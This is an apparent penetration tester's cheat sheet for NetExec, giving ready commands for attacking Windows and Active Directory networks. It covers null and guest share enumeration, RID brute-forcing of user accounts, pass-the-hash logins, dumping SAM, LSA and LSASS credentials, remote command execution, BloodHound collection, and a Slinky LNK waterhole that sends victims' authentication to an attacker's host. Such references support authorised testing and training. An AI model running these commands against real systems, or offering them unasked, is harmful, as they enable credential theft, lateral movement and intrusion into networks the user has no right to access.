# NetExec (nxc)

> NetExec replaces CrackMapExec. Use `nxc` or `netexec`.

**Update:**
```sh
cd /opt/Netexec && git pull && pipx reinstall .
```

---

## Host Discovery & SMB Info

```sh
# Scan subnet - shows OS, hostname, domain, SMB signing status
nxc smb <ip/cidr>
```

**Output tells you:**
- Operating systems and computer names
- Domain name
- SMB signing status (`signing:False` = vulnerable to relay)
- SMBv1 enabled (vulnerable to EternalBlue, no signing by default)

---

## SMB Share Enumeration

### Null Session
```sh
nxc smb <ip/cidr> -u '' -p '' --shares
```

### Guest / Anonymous
```sh
nxc smb <ip/cidr> -u 'guest' -p '' --shares
nxc smb <ip/cidr> -u 'anonymous' -p '' --shares
```

### Dump Share Contents (Spider Plus)
```sh
nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
```

---

## User Enumeration

### RID Brute Force (Enumerate Users via SID)
```sh
nxc smb <ip> -u '' -p '' --rid-brute | grep SidTypeUser | sed 's/.*\\//; s/(.*//'
```

SIDTypes:
- `SidTypeUser` (1): A standard user account.
- `SidTypeGroup` (2): A global or domain group account.
- `SidTypeDomain` (3): A domain object.
- `SidTypeAlias` (4): A local group or alias.
- `SidTypeWellKnownGroup` (5): A group with a constant, predefined SID (e.g., Everyone or Administrators).
- `SidTypeDeletedAccount` (6): A SID that belongs to an account that has been deleted.
- `SidTypeInvalid` (7): An invalid SID.
- `SidTypeUnknown` (8): An unknown SID type (e.g., the object no longer exists).
- `SidTypeComputer` (9): A computer account.
- `SidTypeLabel` (10): An integrity label.
- `SidTypeLogonSession` (11): A logon session
Review the [Microsoft Learn SID_NAME_USE Documentation](https://www.google.com/url?sa=i&source=web&rct=j&url=https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-sid_name_use&ved=2ahUKEwj2wrLPlbyVAxUZuSsGHXMBBVQQy_kOegoIAggACAAIChAC&opi=89978449&cd&psig=AOvVaw0eibFCESkvPq3L35w8MVhJ&ust=1783362624946000) for the full C++ definitions and structural details.

RID format: `S-1-5-21-<DomainID>-<RID>`
- `500` = Administrator
- `501` = Guest
- `1000+` = Regular users



### Get User Descriptions (LDAP)
```sh
nxc ldap <ip> -u 'guest' -p '' -M get-desc-users
```

---

## Authentication & Lateral Movement

### Pass the Password
```sh
nxc smb <ip/cidr> -u <user> -d <domain> -p <password>
nxc smb <ip/cidr> -u <user> -p <password> --continue-on-success
```

### Pass the Hash
```sh
nxc smb <ip/cidr> -u <user> -H <NTLM-hash> --local-auth
```

**`(Pwn3d!)` = local admin on that machine**

---

## Credential Dumping (After Pwn3d)

```sh
# Enumerate shares
nxc smb <ip> -u <user> -H <hash> --local-auth --shares

# Dump SAM (local hashes)
nxc smb <ip> -u <user> -H <hash> --local-auth --sam

# Dump LSA secrets
nxc smb <ip> -u <user> -H <hash> --local-auth --lsa

# Dump LSASS via Lsassy module
nxc smb <ip> -u <user> -H <hash> --local-auth -M lsassy
```

---

## BloodHound Collection
```sh
nxc ldap <DC-IP> -u user -p pass --bloodhound --collection All --dns-server <DC-IP>
```

---

## Execute Commands
```sh
# Run command on remote host
nxc smb <ip> -u <user> -H <hash> -x "whoami"

# PowerShell command
nxc smb <ip> -u <user> -H <hash> -X "Get-LocalUser"
```

---

## LNK Waterhole (Slinky Module)
```sh
nxc smb <ip> -d domain.local -u user -p pass -M slinky -o NAME=test SERVER=<kali-ip>
```

---

## NetExec Database
```sh
nxcdb
```
All captured credentials and pwned hosts stored locally.

---

## SMBClient Commands (Companion Tool)

```sh
# List shares
smbclient -L //<ip> -N

# Connect to share (null session)
smbclient -U 'a' -N //<ip>/<share>

# Download everything recursively
smbclient //<ip>/<share> -N -c 'recurse ON; prompt OFF; mget *'
```

---

## Protocol Support

nxc supports multiple protocols:
- `nxc smb` - Windows/SMB
- `nxc ldap` - LDAP/Active Directory
- `nxc ssh` - Linux SSH targets
- `nxc winrm` - Windows Remote Management
- `nxc rdp` - Remote Desktop Protocol
- `nxc mssql` - SQL Server
- `nxc ftp` - FTP servers
